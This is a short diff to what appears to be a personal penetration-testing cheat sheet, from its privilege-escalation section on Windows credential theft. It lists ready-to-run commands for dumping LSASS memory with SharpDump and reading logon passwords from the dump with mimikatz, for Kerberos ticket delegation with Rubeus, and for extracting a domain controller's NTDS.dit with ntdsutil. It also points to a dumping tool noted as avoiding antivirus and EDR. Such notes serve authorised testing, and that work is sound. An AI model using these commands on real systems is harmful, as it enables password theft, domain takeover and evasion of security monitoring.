@@ -182,10 +182,11 @@ PrivEsc
     Rubeus.exe /tgtdeleg /user:sqlservice (<-SamAccountName)
 
   MiniDump - Offline PW dump
-    .\createminidump.exe
-    .\mimikatz.exe
-    sekurlsa::minidump c:\temp\lsass.dmp
-    sekurlsa::logonpasswords
+    SharpDump.exe
+        Download debugXX.bin
+        Move to offline system; rename to debugXX.gz -> decompress
+        minikatz "sekurlsa::minidump lsass_612.dmp" "sekurlsa::logonPasswords" (must be on same Arch)
+    Dumpert: https://github.com/outflanknl/Dumpert (Should avoid AV and EDR)
     
   Dump DC NTDS.dit
     powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
